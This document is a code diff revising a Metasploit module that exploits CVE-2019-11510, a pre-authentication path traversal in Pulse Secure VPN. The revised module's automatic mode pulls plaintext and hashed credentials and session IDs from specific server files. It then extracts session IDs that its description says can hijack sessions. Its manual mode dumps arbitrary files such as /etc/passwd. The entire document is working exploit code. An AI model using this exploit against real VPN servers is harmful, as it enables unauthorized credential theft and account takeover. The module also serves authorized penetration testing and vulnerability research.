@@ -1,110 +1,174 @@
 ##
-# This module requires Metasploit: https://Metasploit.com/download
-#
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
 ##
 
 class MetasploitModule < Msf::Auxiliary
 
   include Msf::Exploit::Remote::HttpClient
-  include Msf::Post::File
-
 
   def initialize(info = {})
     super(update_info(info,
-     'Name'           => 'Pulse Secure SSL VPN guacamole Path Traversal',
-     'Description'    => %q{
-        Pulse Secure SSL VPN file disclosure via specially crafted HTTP resource requests.
-        This exploit reads the specified file, and displays it.
-        This vulnerability affect ( 8.1R15.1, 8.2 before 8.2R12.1, 8.3 before 8.3R7.1, and 9.0 before 9.0R3.4
+      'Name'                => 'Pulse Secure VPN Arbitrary File Disclosure',
+      'Description'         => %q{
+        This module exploits a pre-auth directory traversal in the Pulse Secure
+        VPN server to dump an arbitrary file. Dumped files are stored in loot.
+
+        If the "Automatic" action is set, plaintext and hashed credentials, as
+        well as session IDs, will be dumped. Valid sessions can be hijacked by
+        setting the "DSIG" browser cookie to a valid session ID.
+
+        For the "Manual" action, please specify a file to dump via the "FILE"
+        option. /etc/passwd will be dumped by default. If the "PRINT" option is
+        set, file contents will be dumped to the screen, with any unprintable
+        characters replaced by a period.
       },
-      'References'     =>
-          [
-              [ 'CVE', '2019-11510'],
-          ],
-          'Author'         => [
-            'Alyssa Herrera', # Proof of Concept
-            'Justin Wagner',  # 0xDezzy - Metasploit
-            'Orange Tsai'     # Discovery
-          ],
-      'License'        => MSF_LICENSE,
-  ))
+      'Author'              => [
+        'Orange Tsai',    # Discovery (@orange_8361)
+        'Meh Chang',      # Discovery (@mehqq_)
+        'Alyssa Herrera', # PoC       (@Alyssa_Herrera_)
+        'Justin Wagner',  # Module    (@0xDezzy)
+        'wvu'             # Module
+      ],
+      'References'          => [
+        ['CVE', '2019-11510'],
+        ['URL', 'https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44101/'],
+        ['URL', 'https://blog.orange.tw/2019/09/attacking-ssl-vpn-part-3-golden-pulse-secure-rce-chain.html'],
+        ['URL', 'https://hackerone.com/reports/591295']
+      ],
+      'DisclosureDate'      => '2019-04-24', # Public disclosure
+      'License'             => MSF_LICENSE,
+      'Actions'             => [
+        ['Automatic', 'Description' => 'Dump creds and sessions'],
+        ['Manual',    'Description' => 'Dump an arbitrary file (FILE option)']
+      ],
+      'DefaultAction'       => 'Automatic',
+      'DefaultOptions'      => {
+        'RPORT'             => 443,
+        'SSL'               => true,
+        'HttpClientTimeout' => 5 # This seems sane, but it's not a float
+      }
+    ))
 
-      register_options(
-      [
-        Opt::RPORT(443),
-        OptString.new('FILE', [ '/etc/passwd',  "Define the remote file to view, ex:/etc/passwd", '/etc/passwd']),
-      ])
-
+    register_options([
+      OptString.new(
+        'FILE',
+        [
+          true,
+          'File to dump (manual mode only)',
+          '/etc/passwd'
+        ]
+      ),
+      OptBool.new(
+        'PRINT',
+        [
+          false,
+          'Print file contents (manual mode only)',
+          false
+        ]
+      )
+    ])
   end
 
-  def check
-    #Tests to see if it can get /etc/passwd. If it can, it's vulnerable
-    uri = '/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/'
-
-    print_good("Checking target...")
-    res = send_request_raw({
-      'method' => 'GET',
-      'uri' => uri
-      })
-
-    unless res && res.code ==200
-      return Exploit::CheckCode::Safe
-    end
-
-    Exploit::CheckCode::Vulnerable
+  def the_chosen_one
+    return datastore['FILE'], 'User-chosen file'
   end
 
   def run
+    files =
+      case action.name
+      when 'Automatic'
+        print_status('Running in automatic mode')
 
-    uri = '/dana-na/../dana/html5acc/guacamole/'
-    file = datastore['FILE']
-    payload = "../../../../../..#{file}?/dana/html5acc/guacamole/"
+        # Order by most sensitive first
+        [
+          plaintext_creds,
+          session_ids,
+          hashed_creds
+        ]
+      when 'Manual'
+        print_status('Running in manual mode')
 
-    print_status("Starting Exploit...")
+        # /etc/passwd by default
+        [the_chosen_one]
+      end
 
-    res = send_request_raw(
-      {
+    files.each do |path, info|
+      print_status("Dumping #{path}")
+
+      res = send_request_raw(
         'method'  => 'GET',
-        'uri'     => uri + payload,
-      },1395)
+        'uri'     => dir_traversal(path),
+        'partial' => true # Allow partial response due to timeout
+      )
 
-      if res.nil?
-        print_error("Connection timed out")
-        return
+      unless res
+        fail_with(Failure::Unreachable, "Could not dump #{path}")
       end
 
-      if (res.code == 200)
-        print_good("Target is Vulnerable!")
-        data = res.body
-        current_host = datastore['RHOST']
-        filename = "msf_sslwebsession_"+current_host+".bin"
-        File.delete(filename) if File.exist?(filename)
-        file_local_write(filename, data)
-        print_good("Parsing file.......")
-        parse()
-      else
-        if(res && res.code == 404)
-          print_error("Target not Vulnerable or Invalid File Path")
-        else
-          print_error("Ooof, try again...")
-        end
-      end
+      handle_response(res, path, info)
     end
+  end
 
-    def parse()
-      current_host = datastore['RHOST']
-      fileObj = File.new("msf_sslwebsession_"+current_host+".bin", "r")
-      #fileObj = store_loot("msf_sslwebsession.bin", 'plain/text', "msf_sslwebsession.bin", 'Downloaded file from pulse secure')
-      words = 0
-      while (line = fileObj.gets)
-        printable_data = line.gsub(/[^[:print:]]/, '.')
-        array_data = printable_data.scan(/.{1,60}/m)
-        for ar in array_data
-          if ar != "............................................................"
-            print_good(ar)
+  def handle_response(res, path, info)
+    case res.code
+    when 200
+      case action.name
+      when 'Automatic'
+        # TODO: Parse plaintext and hashed creds
+        if path == session_ids.first
+          print_status('Parsing session IDs...')
+
+          parse_sids(res.body).each do |sid|
+            print_good("Session ID found: #{sid}")
           end
         end
+      when 'Manual'
+        printable = res.body.gsub(/[^[:print:][:space:]]/, '.')
+
+        print_line(printable) if datastore['PRINT']
+      end
+
+      print_good(store_loot(
+        self.name,                  # ltype
+        'application/octet-stream', # ctype
+        rhost,                      # host
+        res.body,                   # data
+        path,                       # filename
+        info                        # info
+      ))
+    when 302
+      fail_with(Failure::NotVulnerable, "Redirected to #{res.redirection}")
+    when 400
+      print_error("Invalid path #{path}")
+    when 404
+      print_error("#{path} not found")
+    else
+      print_error("I don't know what a #{res.code} code is")
     end
-    fileObj.close
   end
+
+  def dir_traversal(path)
+    normalize_uri(
+      '/dana-na/../dana/html5acc/guacamole/../../../../../..',
+      "#{path}?/dana/html5acc/guacamole/" # Bypass query/vars_get
+    )
+  end
+
+  def parse_sids(body)
+    body.to_s.scan(/randomVal([[:xdigit:]]+)/).flatten.reverse
+  end
+
+  def plaintext_creds
+    return '/data/runtime/mtmp/lmdb/dataa/data.mdb', 'Plaintext credentials'
+  end
+
+  def session_ids
+    return '/data/runtime/mtmp/lmdb/randomVal/data.mdb', 'Session IDs'
+  end
+
+  def hashed_creds
+    return '/data/runtime/mtmp/system', 'Hashed credentials'
+  end
+
 end
